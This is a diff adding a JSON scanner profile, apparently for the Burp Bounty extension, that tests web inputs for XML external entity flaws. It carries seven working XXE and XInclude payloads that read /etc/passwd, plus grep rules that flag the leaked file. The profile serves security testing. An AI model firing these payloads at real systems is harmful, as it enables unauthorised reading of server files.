@@ -1,0 +1,72 @@
+[
+  {
+    "ProfileName": "XXE_Linux",
+    "Name": "",
+    "Enabled": true,
+    "Scanner": 1,
+    "Author": "@burpbounty",
+    "Payloads": [
+      "\u003c?xml version\u003d\"1.0\" encoding\u003d\"ISO-8859-1\"?\u003e\u003c!DOCTYPE foo [\u003c!ELEMENT foo ANY\u003e\u003c!ENTITY xxe SYSTEM \"file:///etc/passwd\"\u003e]\u003e\u003cfoo\u003e\u0026xxe;\u003c/foo\u003e",
+      "\u003c?xml version\u003d\"1.0\" encoding\u003d\"ISO-8859-1\"?\u003e\u003c!DOCTYPE foo [\u003c!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource\u003d/etc/passwd\"\u003e]\u003e\u003cfoo\u003e\u0026xxe;\u003c/foo\u003e",
+      "\u003c?xml version\u003d\"1.0\" encoding\u003d\"ISO-8859-1\"?\u003e\u003c!DOCTYPE foo [\u003c!ENTITY % xxe SYSTEM \"data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk\"\u003e]\u003e\u003cfoo\u003e\u0026xxe;\u003c/foo\u003e",
+      "\u003c?xml version\u003d\"1.0\"?\u003e\u003c!DOCTYPE foo [\u003c!ELEMENT foo ANY\u003e\u003c!ENTITY xxe SYSTEM \"file:///etc/passwd\"\u003e]\u003e\u003cfoo\u003e\u0026xxe;\u003c/foo\u003e",
+      "\u003c?xml version\u003d\"1.0\"?\u003e\u003c!DOCTYPE foo [\u003c!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource\u003d/etc/passwd\"\u003e]\u003e\u003cfoo\u003e\u0026xxe;\u003c/foo\u003e",
+      "\u003c?xml version\u003d\"1.0\"?\u003e\u003c!DOCTYPE foo [\u003c!ENTITY % xxe SYSTEM \"data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk\"\u003e]\u003e\u003cfoo\u003e\u0026xxe;\u003c/foo\u003e",
+      "\u003cfoo xmlns:xi\u003d\"http://www.w3.org/2001/XInclude\"\u003e\u003cxi:include parse\u003d\"text\" href\u003d\"file:///etc/passwd\"/\u003e\u003c/foo\u003e"
+    ],
+    "Encoder": [],
+    "UrlEncode": false,
+    "CharsToUrlEncode": "",
+    "Grep": [
+      "true,,root:x",
+      "true,Or,cm9vdD"
+    ],
+    "Tags": [
+      "XXE",
+      "All"
+    ],
+    "PayloadResponse": false,
+    "NotResponse": false,
+    "TimeOut1": "",
+    "TimeOut2": "",
+    "isTime": false,
+    "contentLength": "",
+    "iscontentLength": false,
+    "CaseSensitive": false,
+    "ExcludeHTTP": true,
+    "OnlyHTTP": false,
+    "IsContentType": false,
+    "ContentType": "",
+    "HttpResponseCode": "",
+    "NegativeCT": false,
+    "IsResponseCode": false,
+    "ResponseCode": "",
+    "NegativeRC": false,
+    "urlextension": "",
+    "isurlextension": false,
+    "NegativeUrlExtension": false,
+    "MatchType": 1,
+    "Scope": 0,
+    "RedirType": 4,
+    "MaxRedir": 5,
+    "payloadPosition": 1,
+    "payloadsFile": "",
+    "grepsFile": "",
+    "IssueName": "XXE_Linux",
+    "IssueSeverity": "High",
+    "IssueConfidence": "Certain",
+    "IssueDetail": "",
+    "RemediationDetail": "",
+    "IssueBackground": "",
+    "RemediationBackground": "",
+    "Header": [],
+    "VariationAttributes": [],
+    "InsertionPointType": [
+      36,
+      64
+    ],
+    "Scanas": false,
+    "Scantype": 0,
+    "pathDiscovery": false
+  }
+]
